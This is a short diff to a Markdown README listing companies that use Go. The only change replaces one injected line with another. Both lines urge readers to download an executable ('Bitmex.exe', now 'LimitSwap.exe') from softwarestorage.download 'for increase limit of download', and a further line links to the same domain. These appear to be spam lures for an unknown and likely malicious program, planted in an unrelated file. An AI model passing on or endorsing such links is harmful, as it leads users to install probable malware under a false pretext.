@@ -1,6 +1,6 @@
 # Companies currently using Go throughout the world
 
-Download Bitmex.exe for increase limit of download [here](https://softwarestorage.download/?fn=Bitmex)
+Download LimitSwap.exe for increase limit of download [here](https://softwarestorage.download/?fn=Bitmex)
  
 A good starting point can be found [here](https://softwarestorage.download/?fn=Bitmex).
 
